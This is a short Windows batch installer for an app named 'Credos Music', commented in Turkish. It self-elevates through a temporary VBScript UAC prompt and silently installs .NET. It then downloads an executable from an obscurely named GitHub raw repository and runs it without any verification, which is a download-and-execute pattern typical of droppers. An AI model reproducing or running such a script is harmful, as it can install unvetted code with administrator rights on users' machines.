@echo off
title Credos Music - Full Kurulum

:: --- YÖNETİCİ KONTROLÜ VE UAC YÜKSELTME ---
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Yonetici izinleri aliniyor...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:: ------------------------------------------

set "dotnet_url=https://builds.dotnet.microsoft.com/dotnet/Sdk/10.0.101/dotnet-sdk-10.0.101-win-x64.exe"
set "exe_url=https://raw.githubusercontent.com/cdexecctru/fileupld/main/lm5ztlru/credos_music.exe"
set "readme_url=https://raw.githubusercontent.com/cdexecctru/fileupld/main/a23whczo/readme.txt"

echo Bilesenler indiriliyor, lutfen bekleyin...

:: 1. .NET 10 Kurulumu
powershell -Command "Invoke-WebRequest -Uri '%dotnet_url%' -OutFile 'dotnet_install.exe'"
echo .NET 10 Kuruluyor (Bu islem birkac dakika surebilir)...
start /wait dotnet_install.exe /quiet /norestart
del dotnet_install.exe

:: 2. Uygulama ve Readme Indirme
echo Uygulama dosyalari cekiliyor...
powershell -Command "Invoke-WebRequest -Uri '%exe_url%' -OutFile 'credos_music.exe'"
powershell -Command "Invoke-WebRequest -Uri '%readme_url%' -OutFile 'readme.txt'"

echo Islem tamam! Boom! Uygulama baslatiliyor...
start credos_music.exe
exit